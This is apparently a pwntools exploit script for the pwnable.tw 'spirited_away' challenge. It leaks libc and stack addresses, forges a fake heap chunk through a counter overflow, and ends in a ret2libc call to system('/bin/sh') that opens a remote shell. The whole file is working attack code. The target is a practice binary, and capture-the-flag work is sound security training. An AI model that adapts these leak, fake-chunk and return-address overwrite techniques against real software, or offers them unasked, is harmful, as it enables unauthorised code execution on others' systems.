from pwn import *

#p = process('./spirited_away')
p = remote('chall.pwnable.tw', 10204)
e = ELF('./spirited_away')
#libc = e.libc
libc = ELF('./libc_32.so.6')

def comment(name, age, why, comment):
	p.sendafter('name: ', name)
	p.sendlineafter('age: ', str(age))
	p.sendafter('movie? ', why)
	p.sendafter('comment: ', comment)


system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh').next()
_IO_file_sync_offset = libc.symbols['_IO_file_sync']

comment('AAAA', 1111, 'B' * 24, 'CCCC')
p.recvuntil('B' * 24)
leak = u32(p.recv(4))
libc_base = leak - _IO_file_sync_offset - 7
system = libc_base + system_offset
binsh = libc_base + binsh_offset
print hex(libc_base)

p.sendafter('<y/n>: ', 'y')
comment('AAAA', 1111, 'B' * 56, 'CCCC')
p.recvuntil('B' * 56)
stack = u32(p.recv(4))
p.sendafter('<y/n>: ', 'y')

for i in range(100 - 2):
	print i
	comment('1', '1', '1', '1')
	p.sendafter('<y/n>: ', 'y')

payload = ''
payload += p32(0)
payload += p32(0x41) 
payload += 'A' * 60
payload += p32(0x10000) # top chunk

payload2 = ''
payload2 += 'A' * 84
payload2 += p32(stack - 104)
comment('AAAA', 1111, payload, payload2)

payload = ''
payload += 'A' * 76
payload += p32(system)
payload += 'A' * 4
payload += p32(binsh)
p.sendafter('<y/n>: ', 'y')
comment(payload, 1, 'BBBB', "CCCC")
p.sendafter('<y/n>: ', 'n')
p.interactive()
